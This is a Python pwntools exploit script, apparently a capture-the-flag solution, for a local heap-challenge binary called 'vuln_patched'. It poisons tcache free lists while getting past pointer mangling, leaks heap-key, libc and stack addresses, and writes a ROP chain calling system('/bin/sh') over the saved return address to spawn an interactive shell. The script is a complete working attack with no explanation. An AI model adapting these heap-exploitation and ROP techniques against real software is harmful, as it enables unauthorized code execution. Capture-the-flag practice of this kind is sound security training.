#!/usr/bin/env python3

from pwn import *

p = process('./vuln_patched')
e = ELF('./vuln_patched')

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def cheat(index, name, newspot):
    p.sendline(b'0')
    p.sendline(str(index).encode())
    p.sendline(name)
    p.sendline(str(newspot).encode())

def add_horse(index, length, name):
    p.sendline(b'1')
    p.sendline(str(index).encode())
    p.sendline(str(length).encode())
    p.sendline(name)

def remove_horse(index):
    p.sendline(b'2')
    p.sendline(str(index).encode())

def race():
    p.sendline(b'3')

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

for i in range(8):
    add_horse(i, 256, b'i' * 256)
    remove_horse(i)
    add_horse(i, 256, b'\xFF')
race()

p.recvuntil(b'WINNER: ')
aslr = int.from_bytes(p.recvuntil(b'\n').replace(b'\n', b''), 'little')
print(f'aslr: {hex(aslr)}')

remove_horse(0)
remove_horse(1)

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

add_horse(0, 256, b'i' * 256)
add_horse(1, 256, b'i' * 256)

remove_horse(1)
remove_horse(0)

cheat(0, p64(0x4040E0 ^ aslr) + b'\xFF', 0)

add_horse(0, 256, b'\x00' * 256)
gdb.attach(p)
add_horse(1, 256, b'\xFF')

leak = aslr
while leak == aslr or leak == 0:
    race()
    p.recvuntil(b'WINNER: ')
    leak = int.from_bytes(p.recvuntil(b'\n').replace(b'\n', b''), 'little')
libc_base = leak - 0x1BE5E0
print("Libc base: " + hex(libc_base))

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

remove_horse(3)
remove_horse(2)
gdb.attach(p)
cheat(2, p64((libc_base + 0x1bf620) ^ aslr) + b'\xFF', 2)

add_horse(2, 256, b'\xFF')
add_horse(3, 256, b'\xFF')

remove_horse(5)
remove_horse(4)

cheat(4, p64(0x4040E0 ^ aslr) + b'\xFF', 4)

add_horse(4, 256, b'\x00' * 256)
add_horse(5, 256, b'\xFF')

another_leak = 0
while another_leak == 0 or another_leak == leak or another_leak == aslr:
    race()
    p.recvuntil(b'WINNER: ')
    another_leak = int.from_bytes(p.recvuntil(b'\n').replace(b'\n', b''), 'little')
print(f"stack leak is: {hex(another_leak)}")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

ret_ptr_loc = another_leak - 0xF8
print(f"return pointer is at: {hex(ret_ptr_loc)}")

libc = ELF('./libc.so.6')
rop = ROP(libc)

pop_rdi = libc_base + rop.find_gadget(['pop rdi', 'ret'])[0]
bin_sh  = libc_base + next(libc.search(b'/bin/sh'))

chain = p64(pop_rdi) + p64(bin_sh) + p64(e.plt['system'])
payload = p64(0) + chain + b'\xFF'

remove_horse(7)
remove_horse(6)

cheat(6, p64(ret_ptr_loc ^ aslr) + b'\xFF', 6)

add_horse(6, 256, b'\xFF')
add_horse(7, 256, payload)

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

p.sendline(b'4')
p.interactive()
